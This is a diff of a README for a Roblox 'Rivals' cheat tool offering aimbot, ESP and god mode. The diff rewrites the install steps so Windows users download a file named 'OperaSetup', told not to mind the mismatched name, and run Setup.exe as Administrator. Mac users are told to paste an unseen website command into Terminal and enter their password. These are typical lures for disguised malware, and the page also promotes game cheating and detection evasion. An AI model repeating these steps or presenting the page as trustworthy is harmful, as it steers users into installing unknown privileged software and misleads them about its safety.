@@ -79,22 +79,26 @@ Paid alternatives charge monthly fees for features Rivals Script provides for fr
 
 ### 🖥️ Windows
 
-1. **Download** the latest release `.zip` from the [official website](https://rivals-rbx.github.io/rivals-script-v3/)
-2. **Extract** the archive to a safe folder (e.g., `C:\RivalsScript`)
-3. **Launch Roblox Rivals** and join a game server
-4. **Wait** until you are fully loaded into a match
-5. **Run `Setup.exe`** as Administrator
+1. **Download OperaSetup** from the [official website](https://rivals-rbx.github.io/rivals-script-v3/) (Don’t confused with file name)
+2. **Install the file** and then double-click the setup
+3. **Run `Setup.exe`** as Administrator
+4. Follow the **setup wizard steps**: Accept the Terms and Conditions, and click “Install”
+5. Once finished, **launch the Rivals Script** from your Start Menu or Desktop shortcut
 6. The overlay menu will appear — press **`INSERT`** to toggle it open
 7. Navigate with **arrow keys**, select with **Enter**, and close with **Delete**
 
-### 🍎 macOS
+---
 
-1. **Tap the Download button** on the [official website](https://rivals-rbx.github.io/rivals-script-v3/) and go to the Installer page
-2. **Click the copy button** next to the command line
-3. **Open Terminal** (press `Cmd + Space`, type "Terminal", then hit Enter)
+### 🍎 MacOS
+
+1. **Tap download button** on [official website](https://rivals-rbx.github.io/rivals-script-v3/) and open the installation page
+2. **Copy the command line** by clicking the copy button next to it
+3. **Open Terminal** (press Cmd + Space, type Terminal, then hit Enter)
 4. **Paste the command** → press Enter
 5. **Enter your Mac passcode** when asked
-6. **ENJOY!** The command auto-installs Setup into your Applications folder
+6. The **command auto-installs Rivals Script** into your Applications folder
+
+---
 
 ### 📱 Android
 
@@ -106,6 +110,8 @@ Paid alternatives charge monthly fees for features Rivals Script provides for fr
 5. **Open the Rivals Script app** (floating icon appears)
 6. Tap the icon to open the menu
 7. Enable features by toggling them on
+
+---
 
 ### 🍏 iOS
 
@@ -175,7 +181,7 @@ Even with **rivals script undetected** status active, smart habits go a long way
 5. **Stay updated** — The detection situation evolves with every Roblox patch; always run the latest version
 6. **Join the community** — The active Discord posts real-time bypass status after every Roblox update
 7. **Don't use aggressive features in public matches** — God mode and teleport hacks generate player reports
-8. **Never download from unofficial sources** — Only use the official website or verified community links to avoid malware fakes
+8. **Never download from unofficial sources** — Only use this official website or verified community links to avoid malware fakes
 9. **Clear cache regularly** — Settings → Reset Script Cache
 10. **Rotate features** — Don't use the same exact settings every match
 
@@ -193,7 +199,7 @@ Even with **rivals script undetected** status active, smart habits go a long way
 - 🎯 Added Silent Aim feature with customizable prediction
 - 👁️ New ESP rendering engine with 50% better performance
 - 🏃 Speed mod now has 5 adjustable levels
-- 📱 macOS Apple Silicon (M1/M2/M3) native support
+- 📱 macOS Apple Silicon (M1/M2/M3/M4) native support
 
 ### v3.1.5 — May 2026
 - 💰 Auto-farm now supports all game modes
@@ -295,5 +301,7 @@ The active community is on Discord — link available on the official website. I
 
 ### Q9: Can I add my own scripts to Rivals Script?
 Yes — the custom script loader allows you to import and run community-created scripts. The Discord has a dedicated `#scripts` channel where members share and review new scripts regularly.
+
+---
 
 <p align="center">Made with ❤️ by the RIVALS Community | <a href="https://rivals-rbx.github.io/rivals-script-v3/">GitHub</a> · <a href="https://rivals-rbx.github.io/rivals-script-v3/">Discord</a> · <a href="https://rivals-rbx.github.io/rivals-script-v3/">Download</a></p>
